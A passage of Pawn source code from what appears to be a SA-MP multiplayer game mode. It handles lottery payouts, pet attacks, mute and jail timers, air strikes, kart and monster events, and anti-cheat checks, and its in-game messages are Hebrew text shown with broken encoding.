		act_SaveWin(lottonum[1],act_Code(aid_chat,0));
  		GiveMoney(lottonum[1],pay);
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][plotto] == lottonum[0] && lottonum[1] != i) SendClientMessage(i,red," .р·ф рхюЁэ тэ Ёщч∙· р· фюёЇ° фЁыхя, ръ фюЁЎч фўущэ рх·ъ");
	}
	lottonum[0] = -1, lottonum[1] = -1, CActID = -1;
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i)) playerinfo[i][plotto] = -1, playerinfo[i][actbonus] = false;
	#if lagtest
		LagTest_End("Lotto2");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: Lotto2");
	return 1;
}
//=[PetAttacking]===============================================================
public PetAttacking(playerid,id)
{
	if(debugstate) printf("PetAttacking(%s(%d),%s(%d)) start",GetName(playerid),playerid,GetName(id),id);
	#if lagtest
		LagTest_Start("PetAttacking");
	#endif
	new Float:p[4], Float:vh, Float:z;
	GetPlayerPos(id,p[0],p[1],p[2]);
	z = p[2];
	if(ObjectToPoint(Pets[playerinfo[playerid][pet][0]][petRadius],playerinfo[playerid][pet][1],p[0],p[1],p[2]))
	{
		if(!IsPlayerDead(id))
		{
			GetObjectPos(playerinfo[playerid][pet][1],p[0],p[1],p[2]);
			if(ObjectToPoint(Pets[playerinfo[playerid][pet][0]][petSize],playerinfo[playerid][pet][1],p[0],p[1],p[2]) && p[2] <= z + 10.0  && p[2] >= z - 10.0)
			{
				if(IsPlayerInAnyVehicle(id))
				{
					GetVehicleHealth(GetPlayerVehicleID(id),vh);
					if(vh >= 0.0) SetVehicleHealth(GetPlayerVehicleID(id),vh-Pets[playerinfo[playerid][pet][0]][petDamage]);
				}
				else Damage(id,Pets[playerinfo[playerid][pet][0]][petDamage],playerid);
			}
			new Float:at, Float:op[3], Float:or[3];
			GetObjectPos(playerinfo[playerid][pet][1],op[0],op[1],op[2]);
			GetObjectRot(playerinfo[playerid][pet][1],or[0],or[1],or[2]);
			GetPlayerPos(id,p[0],p[1],p[2]);
			at = atan2(op[1]-p[1],op[0]-p[0]);
			MoveObject(playerinfo[playerid][pet][1],p[0],p[1],p[2],Pets[playerinfo[playerid][pet][0]][petSpeed]);
			SetObjectRot(playerinfo[playerid][pet][1],or[0],or[1],at+90.0);
			//StopObject(playerinfo[playerid][pet][1]);
			//MoveObject(playerinfo[playerid][pet][1],p[0],p[1],p[2],GetPetSpeed(playerinfo[playerid][pet][0]));
		}
	}
	else
	{
		SendClientMessage(playerid,red," !фўх°ся ф·°чў юшххч ф°рщщф ∙ь фчщф ∙ьъ");
		StopPetAttacking(playerid);
	}
	#if lagtest
		LagTest_End("PetAttacking");
	#endif
	if(debugstate) printf("PetAttacking(%s(%d),%s(%d)) end",GetName(playerid),playerid,GetName(id),id);
	return 1;
}
//=[s0beitban]==================================================================
forward s0beitban(playerid);
public s0beitban(playerid)
{
	if(IsPlayerConnected(playerid) && lagstatus <= 100) return SetBan(playerid,INVALID_PLAYER_ID,"Cheats detected. #2");
	return 0;
}
//=[UnMute]=====================================================================
public UnMute(playerid)
{
	#if lagtest
		LagTest_Start("UnMute");
	#endif
	if(playerinfo[playerid][mute][0] > 0)
	{
		playerinfo[playerid][mute][0]--;
		if(playerinfo[playerid][logged] && playerinfo[playerid][mute][0] % 10 == 0) fsetint(fuser(playerid),"MuteTime",playerinfo[playerid][mute][0]);
	}
	else if(playerinfo[playerid][mute][0] == 0)
	{
		SendClientMessage(playerid,white," .ф∙·ў·ъ щ°уф");
		AdminInfo(playerid,"фф∙·ўф щ°уф срхЇя рхшхюшщ");
		KillTimer(playerinfo[playerid][mute][1]);
		playerinfo[playerid][mute][0] = -1;
		if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"MuteTime",playerinfo[playerid][mute][0]);
	}
	#if lagtest
		LagTest_End("UnMute");
	#endif
	return 1;
}
//=[UnJail]=====================================================================
public UnJail(playerid)
{
	#if lagtest
		LagTest_Start("UnJail");
	#endif
	assert IsPlayerConnected(playerid);
	if(playerinfo[playerid][jail][0] > 0)
	{
		playerinfo[playerid][jail][0]--;
		SetPlayerPos(playerid,264.3591,77.5832,1001.0391);
		SetPlayerFacingAngle(playerid,270.0);
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid,6);
		SetFreeze(playerid,1);
		if(playerinfo[playerid][logged] && playerinfo[playerid][jail][0] % 10 == 0) fsetint(fuser(playerid),"JailTime",playerinfo[playerid][jail][0]);
	}
	else if(playerinfo[playerid][jail][0] == 0)
	{
		SendClientMessage(playerid,white," .∙хч°°· юфыьр");
		AdminInfo(playerid,"∙хч°° юфыьр срхЇя рхшхюшщ");
		playerinfo[playerid][jail][0] = -1;
		KillTimer(playerinfo[playerid][jail][1]);
		SetPlayerInterior(playerid,0);
		SpawnPlayer(playerid);
		SetFreeze(playerid,0);
		if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"JailTime",playerinfo[playerid][jail][0]);
	}
	#if lagtest
		LagTest_End("UnJail");
	#endif
	return 1;
}
//=[AirStrike]==================================================================
public AirStrike(playerid)
{
	if(debugstate) printf("AirStrike(%s(%d)) start",GetName(playerid),playerid);
	#if lagtest
		LagTest_Start("AirStrike");
	#endif
	new Float:aavp[5][3], Float:aaop[5][3], countveh = 0, countobj = 0, Float:viewdis = 10.0, Float:airstrikey = 0.0, r = 0;
	switch(playerinfo[playerid][aause])
	{
		case 1: countveh = 1, countobj = 0, viewdis = 2.5;
		case 2: countveh = 2, countobj = 0, viewdis = 5.0;
		case 3: countveh = 5, countobj = 0, viewdis = 10.0;
		case 4: countveh = 1, countobj = 1, viewdis = 0.1;
		case 5: countveh = 0, countobj = 2, viewdis = 90.0;
	}
	if(countveh > 0) for(new i = 0; i < countveh; i++) GetVehiclePos(playerinfo[playerid][aaveh][i],aavp[i][0],aavp[i][1],aavp[i][2]);
	if(countobj > 0) for(new i = 0; i < countobj; i++) GetSObjectPos(playerinfo[playerid][aaobj][i],aaop[i][0],aaop[i][1],aaop[i][2]);
	//airstrikey = playerinfo[playerid][aaveh][0] == -1 ? aaop[0][1] : aavp[0][1];
	airstrikey = playerinfo[playerid][aapos][1] + playerinfo[playerid][aasetp];
	if(airstrikey < (playerinfo[playerid][aapos][1]+200))
	{
		playerinfo[playerid][aasetp] += 5;
		switch(playerinfo[playerid][aause])
		{
			case 1: SetVehiclePos(playerinfo[playerid][aaveh][0],playerinfo[playerid][aapos][0],playerinfo[playerid][aapos][1]+playerinfo[playerid][aasetp],playerinfo[playerid][aapos][2]+57.0);
			case 2:
			{
				SetVehiclePos(playerinfo[playerid][aaveh][0],playerinfo[playerid][aapos][0]-5.0,playerinfo[playerid][aapos][1]+playerinfo[playerid][aasetp],playerinfo[playerid][aapos][2]+57.0);
				SetVehiclePos(playerinfo[playerid][aaveh][1],playerinfo[playerid][aapos][0]+5.0,playerinfo[playerid][aapos][1]+playerinfo[playerid][aasetp],playerinfo[playerid][aapos][2]+57.0);
			}
			case 3:
			{
				SetVehiclePos(playerinfo[playerid][aaveh][0],playerinfo[playerid][aapos][0]-5.2,playerinfo[playerid][aapos][1]+playerinfo[playerid][aasetp],playerinfo[playerid][aapos][2]+57.0);
				SetVehiclePos(playerinfo[playerid][aaveh][1],playerinfo[playerid][aapos][0]+5.2,playerinfo[playerid][aapos][1]+playerinfo[playerid][aasetp],playerinfo[playerid][aapos][2]+57.0);
				SetVehiclePos(playerinfo[playerid][aaveh][2],playerinfo[playerid][aapos][0]-14.0,playerinfo[playerid][aapos][1]+playerinfo[playerid][aasetp]-7.0,playerinfo[playerid][aapos][2]+57.0);
				SetVehiclePos(playerinfo[playerid][aaveh][3],playerinfo[playerid][aapos][0]+14.0,playerinfo[playerid][aapos][1]+playerinfo[playerid][aasetp]-7.0,playerinfo[playerid][aapos][2]+57.0);
				SetVehiclePos(playerinfo[playerid][aaveh][4],playerinfo[playerid][aapos][0]+7.5,playerinfo[playerid][aapos][1]+playerinfo[playerid][aasetp]-3.0,playerinfo[playerid][aapos][2]);
			}
			case 4:
			{
				SetVehiclePos(playerinfo[playerid][aaveh][0],playerinfo[playerid][aapos][0],playerinfo[playerid][aapos][1]+playerinfo[playerid][aasetp],playerinfo[playerid][aapos][2]+57.0);
				SetVehicleZAngle(playerinfo[playerid][aaveh][0],0.0 + float(randomEx(-2,2)));
				if(playerinfo[playerid][aaobj][0] != -1) MoveSObject(playerinfo[playerid][aaobj][0],playerinfo[playerid][aapos][0],playerinfo[playerid][aapos][1]+playerinfo[playerid][aasetp],playerinfo[playerid][aapos][2]+54.0,10.0);
			}
			case 5:
			{
				MoveSObject(playerinfo[playerid][aaobj][0],playerinfo[playerid][aapos][0],playerinfo[playerid][aapos][1]+playerinfo[playerid][aasetp],playerinfo[playerid][aapos][2]+57.0,10.0,0.0,0.0,playerinfo[playerid][aaparam] == 4 ? 0.0 : floatmul(90.0,float(playerinfo[playerid][aaparam])));
				if(playerinfo[playerid][aaparam] == 1) MoveSObject(playerinfo[playerid][aaobj][1],playerinfo[playerid][aapos][0],playerinfo[playerid][aapos][1]+playerinfo[playerid][aasetp]-5.0,playerinfo[playerid][aapos][2]+52.0,10.0,0.0,0.0,playerinfo[playerid][aaparam] == 4 ? 0.0 : floatmul(90.0,float(playerinfo[playerid][aaparam])));
				else if(playerinfo[playerid][aaparam] == 2) MoveSObject(playerinfo[playerid][aaobj][1],playerinfo[playerid][aapos][0]-9.0,playerinfo[playerid][aapos][1]+playerinfo[playerid][aasetp]-5.0,playerinfo[playerid][aapos][2]+52.0,10.0,0.0,0.0,playerinfo[playerid][aaparam] == 4 ? 0.0 : floatmul(90.0,float(playerinfo[playerid][aaparam])));
				else if(playerinfo[playerid][aaparam] == 3) MoveSObject(playerinfo[playerid][aaobj][1],playerinfo[playerid][aapos][0]+9.0,playerinfo[playerid][aapos][1]+playerinfo[playerid][aasetp]-5.0,playerinfo[playerid][aapos][2]+52.0,10.0,0.0,0.0,playerinfo[playerid][aaparam] == 4 ? 0.0 : floatmul(90.0,float(playerinfo[playerid][aaparam])));
				playerinfo[playerid][aaparam]++;
				if(playerinfo[playerid][aaparam] == 4) playerinfo[playerid][aaparam] = 1;
			}
		}
	}
	else if(airstrikey >= (playerinfo[playerid][aapos][1]+200))
	{
		if(countveh > 0) for(new i = 0; i < countveh; i++) if(playerinfo[playerid][aaveh][i] != -1)
		{
			DestroyVehicleEx(playerinfo[playerid][aaveh][i]);
			playerinfo[playerid][aaveh][i] = -1;
		}
		if(countobj > 0) for(new i = 0; i < countobj; i++) if(playerinfo[playerid][aaobj][i] != -1)
		{
			DestroySObject(playerinfo[playerid][aaobj][i]);
			playerinfo[playerid][aaobj][i] = -1;
		}
		playerinfo[playerid][aause] = 0, playerinfo[playerid][aaparam] = 0;
		KillTimer(playerinfo[playerid][aatimer]);
	}
	if(airstrikey >= (playerinfo[playerid][aapos][1]-viewdis) && airstrikey <= (playerinfo[playerid][aapos][1]+viewdis)) switch(playerinfo[playerid][aause])
	{
		case 1: SendObject(354,aavp[0][0],aavp[0][1],aavp[0][2],playerinfo[playerid][aapos][0],playerinfo[playerid][aapos][1],playerinfo[playerid][aapos][2],18.0,6);
		case 2: for(new i = 0; i < 2; i++) SendObject(354,aavp[i][0],aavp[i][1],aavp[i][2],playerinfo[playerid][aapos][0] + floatrand(-5.0,5.0),playerinfo[playerid][aapos][1] + floatrand(-5.0,5.0),playerinfo[playerid][aapos][2],23.0,6);
		case 3: for(new i = 0; i < 2; i++) SendObject(354,aavp[i][0],aavp[i][1],aavp[i][2],playerinfo[playerid][aapos][0] + floatrand(-8.0,8.0),playerinfo[playerid][aapos][1] + floatrand(-8.0,8.0),playerinfo[playerid][aapos][2],23.0,6);
		case 4: if(playerinfo[playerid][aaobj][0] != -1)
		{
			MoveSObject(playerinfo[playerid][aaobj][0],playerinfo[playerid][aapos][0],playerinfo[playerid][aapos][1],playerinfo[playerid][aapos][2],20.0,0.0,270.0,0.0);
			objectinfo[playerinfo[playerid][aaobj][0]][oeam] = 14;
			objectinfo[playerinfo[playerid][aaobj][0]][odam] = 1;
			playerinfo[playerid][aaobj][0] = -1;
		}
		case 5: if(playerinfo[playerid][aaparam] == 1)
		{
			for(new i = 0, Float:p[3]; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && IsPlayerInRangeOfPoint(i,90.0,playerinfo[playerid][aapos][0],playerinfo[playerid][aapos][1],playerinfo[playerid][aapos][2]) && i != playerid && !PlayerTeamedWith(playerid,i))
			{
				GetPlayerPos(i,p[0],p[1],p[2]);
				r = random(2);
				SendObject(18647 + random(6),aaop[r][0],aaop[r][1],aaop[r][2],p[0],p[1],p[2],35.0,12);
			}
		}
	}
	#if lagtest
		LagTest_End("AirStrike");
	#endif
	if(debugstate) printf("AirStrike(%s(%d)) end",GetName(playerid),playerid);
	return 1;
}
//=[StartKart]==================================================================
public StartKart()
{
	if(debugstate) printf("Gamemode Activity [start]: StartKart");
	#if lagtest
		LagTest_Start("StartKart");
	#endif
	if(thereIsAct) return 0;
	kartinfo[0] = 1, kartinfo[1] = 0, kartinfo[2] = 60, kartinfo[3] = SetTimer("StartKart2",1000,1), kartinfo[4] = 0, kartinfo[5] = 0;
	SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х [ " @c(lightblue) "ЇЄщьх· рхшхюшщ·" @h(6DC5F3) " ] Х Х Х Х Х");
	SendClientMessageToAll(green," !··чщь сЄху уўф Kart фЇЄщьх·");
	SendClientMessageToAll(green," /join рх /kart join ьфЎш°Їх· °∙юх р· фЇўхуф");
	SendClientMessageToAll(yellow," * .Єхьф " #join_act "$ хфЇ°ё ьцхыф фхр " #actprize_kart "$ Kart фЎш°Їх· ь·ч°х· ф");
	SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х");
	GameTextForAll("~g~kart~n~/join",6000,1);
	thereIsAct = true;
	#if lagtest
		LagTest_End("StartKart");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: StartKart");
	return 1;
}
//=[StartKart2]=================================================================
public StartKart2()
{
	if(debugstate) printf("Gamemode Activity [start]: StartKart2");
	#if lagtest
		LagTest_Start("StartKart2");
	#endif
	new string[M_S];
	kartinfo[2]--;
	if(kartinfo[2] > 0)
	{
		for(new i=0;i<sizeof(ActivitiesGameTextTimes);i++)
		{
			if(kartinfo[2] == ActivitiesGameTextTimes[i])
			{
				format(string,sizeof(string),"~g~Kart: ~h~%d~n~~g~(%d/%d)",kartinfo[2],kartinfo[1],sizeof(KartPositions));
				GameTextForAll(string,999,4);
				for(new ii=0;ii<MAX_PLAYERS_;ii++) if(IsPlayerConnected(ii) && !playerinfo[ii][modeafk]) PlaySound(ii,1056);
			}
		}
		if(kartinfo[2] == 15 || kartinfo[2] == 30)
		{
			format(string,sizeof(string)," /join :··чщь сЄху %d ∙Ёщх·, ьфЎш°Їх· Kart ·ч°х· ф",kartinfo[2]);
			SendClientMessageToAll(brown,string);
		}
	}
	if(kartinfo[2] == 3)
	{
		if(kartinfo[1] < 2) return EndKart("юёЇ° ф∙чўЁщэ ∙фЎш°Їх ўшя ю2",-1);
		for(new i=0;i<MAX_PLAYERS_;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitkart])
			{
				SetFreeze(i,1);
				ResetWeapons(i);
				if(IsPlayerUsingSGuard_(i)) SetPlayerGravity(i,0.008000); // guard_shit
				TakeSpecialComponent(i);
				SetPlayerVirtualWorld(i,world_kart);
				for(new ii=0;ii<MAX_PLAYERS_;ii++)
				{
					if(IsPlayerConnected(ii))
					{
						ShowPlayerNameTagForPlayer(ii,i,1);
						SetPlayerMarkerForPlayer(ii,i,GetColor(i,85));
					}
				}
				playerinfo[i][invisible] = 0;
				if(playerinfo[i][pet][0]) command(i,"/pet off");
				SetPlayerTeam(i,NO_TEAM);
				PutPlayerInVehicle(i,playerinfo[i][kartv],0);
				SetPlayerInterior(i,0);
				SetCameraBehindPlayer(i);
				SetVehicleHealth(playerinfo[i][kartv],1000.0);
				SetPlayerHealth(i,100.0);
				SetPlayerArmour(i,100.0);
				ResetWeapons(i);
				vehicleinfo[playerinfo[i][kartv]][kartdriver] = i;
				PlaySound(i,1062);
				SendClientMessage(i,orange," !KartсфЎьчф с·ч°х· ф");
				playerinfo[i][inact] = 1;
			}
		}
	}
	if(kartinfo[2] == 0)
	{
		for(new i=0;i<MAX_PLAYERS_;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitkart])
			{
				playerinfo[i][inkart] = 1, playerinfo[i][waitkart] = 0;
				SetFreeze(i,0);
			}
		}
		SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х [ " @c(lightblue) "ЇЄщьх· рхшхюшщ·" @h(6DC5F3) " ] Х Х Х Х Х");
		format(string,sizeof(string)," ф·чщьф! юёЇ° фю∙··Їщэ: %d Kart-·ч°х· ф",kartinfo[1]);
		SendClientMessageToAll(green,string);
		SendClientMessageToAll(grey," /astats ьЎЇщщф с∙чўЁщ фЇЄщьх· Х /aquit - ьщЎщрф юфЇЄщьх·");
		SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х");
		KillTimer(kartinfo[3]);
		kartinfo[3] = SetTimer("CheckKart",1000,1);
	}
	#if lagtest
		LagTest_End("StartKart2");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: StartKart2");
	return 1;
}
//=[CheckKart]==================================================================
public CheckKart()
{
	if(debugstate) printf("Gamemode Activity [start]: CheckKart");
	#if lagtest
		LagTest_Start("CheckKart");
	#endif
	if(!kartinfo[4] && !random(4))
	{
		kartinfo[4] = CreatePickupEx(3096,14,1520.0 + floatrand(-28.0,28.0),-1130.0 + floatrand(-18.0,18.0),135.8281,24,world_kart,random(sizeof(TemporaryActivityPickups)-1));
		kartinfo[5] = 7;
	}
	if(kartinfo[4] > 0 && kartinfo[5] > 0)
	{
		kartinfo[5]--;
		if(!kartinfo[5])
		{
			DestroyPickupEx(kartinfo[4]);
			kartinfo[4] = 0;
		}
	}
	new Float:p[3], Float:h;
	for(new i=0;i<MAX_PLAYERS_;i++)
	{
		if(IsPlayerConnected(i) && playerinfo[i][inkart])
		{
			GetVehicleHealth(GetPlayerVehicleID(i),h);
			SetPlayerArmour(i,floatround(h) / 10);
			GetVehiclePos(GetPlayerVehicleID(i),p[0],p[1],p[2]);
			if(p[2] < (KartPositions[0][2]-1.5))
			{
				OutOfActivity(i);
				SendClientMessage(i,red," .Kart фЇёу· с·ч°х· ф");
				PlaySound(i,1063);
			}
		}
	}
	#if lagtest
		LagTest_End("CheckKart");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: CheckKart");
	return 1;
}
//=[StartMonster]===============================================================
public StartMonster()
{
	if(debugstate) printf("Gamemode Activity [start]: StartMonster");
	#if lagtest
		LagTest_Start("StartMonster");
	#endif
	if(thereIsAct) return 0;
	monsterinfo[0] = 1, monsterinfo[1] = 0, monsterinfo[2] = 60, monsterinfo[3] = SetTimer("StartMonster2",1000,1);
	SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х [ " @c(lightblue) "ЇЄщьх· рхшхюшщ·" @h(6DC5F3) " ] Х Х Х Х Х");
	SendClientMessageToAll(green," !·ч°х· фюхЁёш°щэ фю·Ёт∙щэ ··чщь сЄху уўф");
	SendClientMessageToAll(green," /join рх /monster join ьфЎш°Їх· °∙юх р· фЇўхуф");
	SendClientMessageToAll(yellow," * .ффЎш°Їх· ьЇЄщьх· цх Єхьф " #join_act "$ хфЇ°ё ьцхыф фхр" #actprize_monster "$");
	SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х");
	GameTextForAll("~p~monster~n~/join",6000,1);
	thereIsAct = true;
	#if lagtest
		LagTest_End("StartMonster");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: StartMonster");
	return 1;
}
//=[StartMonster2]==============================================================
public StartMonster2()
{
	if(debugstate) printf("Gamemode Activity [start]: StartMonster2");
	#if lagtest
		LagTest_Start("StartMonster2");
	#endif
	new string[M_S];
	monsterinfo[2]--;
	if(monsterinfo[2] > 0)
	{
		for(new i=0;i<sizeof(ActivitiesGameTextTimes);i++)
		{
			if(monsterinfo[2] == ActivitiesGameTextTimes[i])
			{
				format(string,sizeof(string),"~p~Monster: ~h~%d~n~~p~(%d/%d)",monsterinfo[2],monsterinfo[1],sizeof(MonsterPositions));
				GameTextForAll(string,999,4);
				for(new ii=0;ii<MAX_PLAYERS_;ii++) if(IsPlayerConnected(ii) && !playerinfo[ii][modeafk]) PlaySound(ii,1056);
			}
		}
		if(monsterinfo[2] == 15 || monsterinfo[2] == 30)
		{
			format(string,sizeof(string)," /join :··чщь сЄху %d ∙Ёщх·, ьфЎш°Їх· Monster ·ч°х· ф",monsterinfo[2]);
			SendClientMessageToAll(brown,string);
		}
	}
	if(monsterinfo[2] == 3)
	{
		if(monsterinfo[1] < 2) return EndMonster("юёЇ° ф∙чўЁщэ ∙фЎш°Їх ўшя ю2",-1);
		for(new i=0;i<MAX_PLAYERS_;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitmonster])
			{
				SetFreeze(i,1);
				if(IsPlayerUsingSGuard_(i)) SetPlayerGravity(i,0.008000); // guard_shit
				TakeSpecialComponent(i);
				ResetWeapons(i);
				SetPlayerVirtualWorld(i,world_monster);
				SetVehicleVirtualWorld(playerinfo[i][monsterv],world_monster);
				SetPlayerInterior(i,15);
				LinkVehicleToInterior(playerinfo[i][monsterv],15);
				for(new ii=0;ii<MAX_PLAYERS_;ii++)
				{
					if(IsPlayerConnected(ii))
					{
						ShowPlayerNameTagForPlayer(ii,i,1);
						SetPlayerMarkerForPlayer(ii,i,GetColor(i,85));
					}
				}
				playerinfo[i][invisible] = 0;
				if(playerinfo[i][pet][0]) command(i,"/pet off");
				SetPlayerTeam(i,NO_TEAM);
				PutPlayerInVehicle(i,playerinfo[i][monsterv],0);
				SetCameraBehindPlayer(i);
				SetVehicleHealth(playerinfo[i][monsterv],1000.0);
				ResetWeapons(i);
				vehicleinfo[playerinfo[i][monsterv]][monsterdriver] = i;
				SendClientMessage(i,orange," !MonsterсфЎьчф с·ч°х· ф");
				playerinfo[i][inact] = 1;
			}
		}
	}
	if(monsterinfo[2] == 0)
	{
		for(new i=0;i<MAX_PLAYERS_;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitmonster])
			{
				playerinfo[i][inmonster] = 1, playerinfo[i][waitmonster] = 0;
				SetFreeze(i,0);
			}
		}
		SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х [ " @c(lightblue) "ЇЄщьх· рхшхюшщ·" @h(6DC5F3) " ] Х Х Х Х Х");
		format(string,sizeof(string)," ф·чщьф! юёЇ° фю∙··Їщэ: %d Monster-·ч°х· ф",monsterinfo[1]);
		SendClientMessageToAll(green,string);
		SendClientMessageToAll(grey," /astats ьЎЇщщф с∙чўЁщ фЇЄщьх· Х /aquit - ьщЎщрф юфЇЄщьх·");
		SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х");
		KillTimer(monsterinfo[3]);
		monsterinfo[3] = SetTimer("CheckMonster",1000,1);
	}
	#if lagtest
		LagTest_End("StartMonster2");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: StartMonster2");
	return 1;
}
//=[CheckMonster]===============================================================
public CheckMonster()
{
	if(debugstate) printf("Gamemode Activity [start]: CheckMonster");
	#if lagtest
		LagTest_Start("CheckMonster");
	#endif
	if(!monsterinfo[4] && !random(4))
	{
		monsterinfo[4] = CreatePickupEx(3096,14,-1400.0 + floatrand(-60.0,60.0),996.0 + floatrand(-25.0,25.0),1024.1184,24,world_monster,random(!random(2) ? sizeof(TemporaryActivityPickups) : sizeof(TemporaryActivityPickups)-1));
		monsterinfo[5] = 7;
	}
	if(monsterinfo[4] > 0 && monsterinfo[5] > 0)
	{
		monsterinfo[5]--;
		if(!monsterinfo[5])
		{
			DestroyPickupEx(monsterinfo[4]);
			monsterinfo[4] = 0;
		}
	}
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][inmonster])
	{
		new Float:h;
		GetVehicleHealth(GetPlayerVehicleID(i),h);
		SetPlayerArmour(i,floatround(h) / 10);
	}
	#if lagtest
		LagTest_End("CheckMonster");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: CheckMonster");
	return 1;
}
//=[OnPlayerTeamPrivmsg]========================================================
public OnPlayerTeamPrivmsg(playerid,msg[])
{
	SendClientMessage(playerid,red," .юЄ°ы· фшщэ Ў'рш ∙ь фёрюЇ схшьф");
	return 0;
}
//=[Contents2]==================================================================
public Contents2()
{
	#if lagtest
		LagTest_Start("Contents2");
	#endif
	new Float:p[3], pumplvl = lcmdid("/pump",1), Float:op[3], k[3], string[M_S];
	for(new i=0;i<MAX_PLAYERS_;i++)
	{
		if(IsPlayerConnected(i) && !IsPlayerNPC(i))
		{
			if(!IsPlayerMAdmin(i))
			{
				// Money hack
				#if acmoney == 2
					if(GetMoney(i) <= playerinfo[i][money][0] && !playerinfo[i][money][2]) playerinfo[i][moneywarns] = 0, playerinfo[i][money][0] = GetMoney(i);
					else
					{
						if(GetMoney(i) > playerinfo[i][money][0]+1000 && !playerinfo[i][money][2])
		 				{
		   					if(playerinfo[i][money][1] >= GetMoney(i)) playerinfo[i][money][1] = GetMoney(i), playerinfo[i][money][0] = GetMoney(i);
							else
		 		   			{
		 						playerinfo[i][moneywarns]++;
			  	   				if(playerinfo[i][moneywarns] == 2) return Cheat(i,"Money hack",1);
							}
						}
					}
		   			playerinfo[i][money][2] = 0;
				#elseif acmoney == 1
		   			/*if(GetMoney(i) > playerinfo[i][money][0])
		   			{
		   				playerinfo[i][money][1]++;
						format(string,sizeof(string)," .Ёр ьр ьф∙·ю∙ сЎ'щш ыёє. рцф°ф %d ю·хъ 3",playerinfo[i][money][1]);
		   				SendClientMessage(i,red,string);
		   				format(string,sizeof(string),"Money hack try %d (%d$)",playerinfo[i][money][1],GetMoney(i)-playerinfo[i][money][0]);
						Log("Cheating",i,string);
						ResetPlayerMoney(i);
		   				if(playerinfo[i][money][1] >= 3) return Cheat(i,"Money hack",1);
		   			}*/
	   			#endif
			}
			// Weapon hack
			if(playerinfo[i][dontwac] > 0)
			{
				UpdatePlayerWeapons(i);
				playerinfo[i][dontwac]--;
			}
			/*if(playerinfo[i][alive] && !playerinfo[i][gw] && !playerinfo[i][dontwac])
			{
				for(new j = 1; j < 12; j++)
				{
					GetPlayerWeaponData(i,j,ww[0],ww[1]);
					if(ww[0] > 0 && ww[1] > 0) if(!playerinfo[i][acweapon][ww[0]] || (playerinfo[i][acammo][ww[0]] < ww[1] && playerinfo[i][acammo][ww[0]] > 0 && playerinfo[i][acammo][ww[0]] < 10000))
					{
						AdminInfo(i,"Weapons Hack?");
						//Cheat(i,"Weapons hack",1);
						ResetWeapons(i);
					}
				}
			}*/
			// Jetpack hack
			if(GetPlayerSpecialAction(i) == SPECIAL_ACTION_USEJETPACK && !IsPlayerMAdmin(i) && !playerinfo[i][jetpack] && !playerinfo[i][inact] && !playerinfo[i][dontac]) return Cheat(i,"Jetpack hack",1);
			// Spectate hack
			if(GetPlayerState(i) == PLAYER_STATE_SPECTATING && !IsPlayerMAdmin(i) && !playerinfo[i][viewerwwe] && playerinfo[i][spectate] == -1 && playerinfo[i][viewingvehicle] == -1 && !playerinfo[i][dontac] && !playerinfo[i][specallowed]) return Cheat(i,"Spectate hack",1);
			// Vehicle health hack
			if(GetPlayerState(i) == PLAYER_STATE_DRIVER && !IsPlayerMAdmin(i))
			{
				GetVehicleHealth(GetPlayerVehicleID(i),p[0]);
				if(p[0] > vehicleinfo[GetPlayerVehicleID(i)][vhealth] && !vehicleinfo[GetPlayerVehicleID(i)][vgm])
				{
					vehicleinfo[GetPlayerVehicleID(i)][vhealth] = p[0];
					Cheat(i,"Vehicle health hack",2);
					if(!IsPlayerConnected(i)) continue;
				}
			}
			// Raise Update
			GetPlayerPos(i,p[0],p[1],p[2]);
			if(playerinfo[i][raise] != INVALID_PLAYER_ID) SetPlayerPos(playerinfo[i][raise],p[0],p[1],p[2] - 2.0);
			// Pump Update
			if(playerinfo[i][pump] != INVALID_PLAYER_ID) if(GetDistanceBetweenPlayers(i,playerinfo[i][pump]) <= (7.0 + 3.0 * playerinfo[i][upgradecmd][pumplvl]))
			{
				Damage(playerinfo[i][pump],3.0 * playerinfo[i][upgradecmd][pumplvl]);
				AddHP(i,3.0 * playerinfo[i][upgradecmd][pumplvl]);
			}
			else
			{
				SendClientMessage(i,red," .∙рщс· фчщщэ фхЇёўф ыщ ф∙чўя ∙∙рс· ююЁх чщщэ ф·°чў");
				SendClientMessage(playerinfo[i][pump],red," .∙рщс· фчщщэ фхЇёўф ыщ ф·°чў· юф∙чўя ∙∙рс ююъ");
				playerinfo[i][pump] = INVALID_PLAYER_ID;
			}
			// No Reload
			if(playerinfo[i][nr] && IsPlayerMAdmin(i)) GiveWeapon(i,GetPlayerWeapon(i),2);
			// Anti Bank / Ammunation Shooting
			//if((GetPlayerCheckpoint(i) == cp_bank || GetPlayerCheckpoint(i) == cp_ammu || GetPlayerCheckpoint(i) == cp_vstore) && playerinfo[i][spectate] == -1 && !IsPlayerMAdmin(i) && GetPlayerWeapon(i) != 1 && GetPlayerWeapon(i) != 0 && !playerinfo[i][srin]) StopPlayer(i);
			// Changed Colors
